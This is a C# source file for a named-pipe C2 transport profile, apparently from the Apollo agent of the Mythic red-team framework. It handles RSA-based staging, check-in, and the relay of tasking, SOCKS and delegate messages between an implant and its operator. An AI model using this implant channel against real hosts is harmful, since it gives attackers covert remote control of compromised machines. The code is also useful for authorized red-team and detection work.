using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Interfaces;
using ApolloInterop.Classes;
using System.IO.Pipes;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Types.Delegates;
using System.Runtime.Serialization.Formatters.Binary;
using ApolloInterop.Structs.ApolloStructs;
using System.Collections.Concurrent;
using ApolloInterop.Enums.ApolloEnums;
using System.Threading;
using ST = System.Threading.Tasks;
using ApolloInterop.Serializers;

namespace NamedPipeTransport
{
    public class NamedPipeProfile : C2Profile, IC2Profile, INamedPipeCallback
    {
        private static JsonSerializer _jsonSerializer = new JsonSerializer();
        private string _namedPipeName;
        private AsyncNamedPipeServer _server;
        private INamedPipeCallback _callback;
        private bool _encryptedExchangeCheck;
        private const int _SERVER_SEND_SIZE = 30000;
        private const int _SERVER_RECV_SIZE = 30000;
        private static ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
        private static ConcurrentQueue<IMythicMessage> _recieverQueue = new ConcurrentQueue<IMythicMessage>();
        private Dictionary<PipeStream, ST.Task> _writerTasks = new Dictionary<PipeStream, ST.Task>();
        private Action<object> _sendAction;
        ConcurrentDictionary<string, IPCMessageStore> _messageOrganizer = new ConcurrentDictionary<string, IPCMessageStore>();
        public NamedPipeProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
        {
            _namedPipeName = data["pipename"];
            _encryptedExchangeCheck = data["encrypted_exchange_check"] == "T";
            _sendAction = (object p) =>
            {
                while (((PipeStream)p).IsConnected)
                {
                    if (_senderQueue.TryDequeue(out byte[] result))
                    {
                        ((PipeStream)p).BeginWrite(result, 0, result.Length, OnAsyncMessageSent, p);
                    }
                    else
                    {
                        Thread.Sleep(1000);
                    }
                }
            };
        }

        public void OnAsyncConnect(PipeStream pipe, out Object state)
        {
            _writerTasks[pipe] = new ST.Task(_sendAction, pipe);
            _writerTasks[pipe].Start();
            Connected = true;
            state = this;
        }

        public void OnAsyncDisconnect(PipeStream pipe, Object state)
        {
            pipe.Close();
            _writerTasks[pipe].Wait();
            _writerTasks.Remove(pipe);
        }

        public void OnAsyncMessageReceived(PipeStream pipe, IPCData data, Object state)
        {
            IPCChunkedData chunkedData = _jsonSerializer.Deserialize<IPCChunkedData>(
                Encoding.UTF8.GetString(data.Data.Take(data.DataLength).ToArray()));
            lock(_messageOrganizer)
            {
                if (!_messageOrganizer.ContainsKey(chunkedData.ID))
                {
                    _messageOrganizer[chunkedData.ID] = new IPCMessageStore(DeserializeToReceiverQueue);
                }
            }
            _messageOrganizer[chunkedData.ID].AddMessage(chunkedData);
        }

        private void OnAsyncMessageSent(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result;
            pipe.EndWrite(result);
            if (_senderQueue.TryDequeue(out byte[] data))
            {
                pipe.BeginWrite(data, 0, data.Length, OnAsyncMessageSent, pipe);
            }
        }

        private bool AddToSenderQueue(IMythicMessage msg)
        {
            IPCChunkedData[] parts = Serializer.SerializeIPCMessage(msg, _SERVER_SEND_SIZE - 1000);
            foreach(IPCChunkedData part in parts)
            {
                _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_jsonSerializer.Serialize(part)));
            }
            return true;
        }

        public bool DeserializeToReceiverQueue(byte[] data, MessageType mt)
        {
            IMythicMessage msg = Serializer.DeserializeIPCMessage(data, mt);
            Console.WriteLine("We got a message: {0}", mt.ToString());
            _recieverQueue.Enqueue(msg);
            return true;
        }


        public bool Recv(MessageType mt, OnResponse<IMythicMessage> onResp)
        {
            while (Agent.IsAlive())
            {
                IMythicMessage msg = _recieverQueue.SingleOrDefault(m => m.GetTypeCode() == mt);
                if (msg != null)
                {
                    _recieverQueue = new ConcurrentQueue<IMythicMessage>(_recieverQueue.Where(m => m != msg));
                    return onResp(msg);
                } else
                {
                    Thread.Sleep(100);
                }
            }
            return true;
        }

        
        public bool Connect(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
        {
            if (_server == null)
            {
                _server = new AsyncNamedPipeServer(_namedPipeName, _callback, null, 1, _SERVER_SEND_SIZE, _SERVER_RECV_SIZE);
            }

            if (_encryptedExchangeCheck)
            {
                var rsa = Agent.GetApi().NewRSAKeyPair(4096);
                EKEHandshakeMessage handshake1 = new EKEHandshakeMessage()
                {
                    Action = "staging_rsa",
                    PublicKey = rsa.ExportPublicKey(),
                    SessionID = rsa.SessionId
                };
                AddToSenderQueue(handshake1);
                if (!Recv(MessageType.EKEHandshakeResponse, delegate(IMythicMessage resp)
                {
                    EKEHandshakeResponse respHandshake = (EKEHandshakeResponse)resp;
                    byte[] tmpKey = rsa.RSA.Decrypt(Convert.FromBase64String(respHandshake.SessionKey), true);
                    ((ICryptographySerializer)Serializer).UpdateKey(Convert.ToBase64String(tmpKey));
                    ((ICryptographySerializer)Serializer).UpdateUUID(respHandshake.UUID);
                    return true;
                }))
                {
                    return false;
                }
            }
            AddToSenderQueue(checkinMsg);
            return Recv(MessageType.MessageResponse, delegate (IMythicMessage resp)
            {
                MessageResponse mResp = (MessageResponse)resp;
                Connected = true;
                ((ICryptographySerializer)Serializer).UpdateUUID(mResp.ID);
                return onResp(mResp);
            });
        }

        public void Start()
        {
            Action<object> agentMessageConsumer = (object o) =>
            {
                while(Agent.IsAlive())
                {
                    if (!Agent.GetTaskManager().CreateTaskingMessage(delegate (TaskingMessage tm)
                    {
                        if (tm.Delegates.Length != 0 || tm.Responses.Length != 0 || tm.Socks.Length != 0)
                        {
                            AddToSenderQueue(tm);
                            return true;
                        }
                        return false;
                    }))
                    {
                        Thread.Sleep(100);
                    }
                }
            };
            ST.Task agentConsumerTask = new ST.Task(agentMessageConsumer, null);
            agentConsumerTask.Start();
            while(Agent.IsAlive())
            {
                Recv(MessageType.MessageResponse, delegate (IMythicMessage msg)
                {
                    return Agent.GetTaskManager().ProcessMessageResponse((MessageResponse)msg);
                });
            }
            agentConsumerTask.Wait();
        }

        public bool Send<IMythicMessage>(IMythicMessage message)
        {
            return AddToSenderQueue((ApolloInterop.Interfaces.IMythicMessage)message);
        }

        public bool SendRecv<T, TResult>(T message, OnResponse<TResult> onResponse)
        {
            throw new NotImplementedException();
        }

        public bool IsOneWay()
        {
            return true;
        }

        public bool IsConnected()
        {
            return _writerTasks.Keys.Count > 0;
        }
    }
}
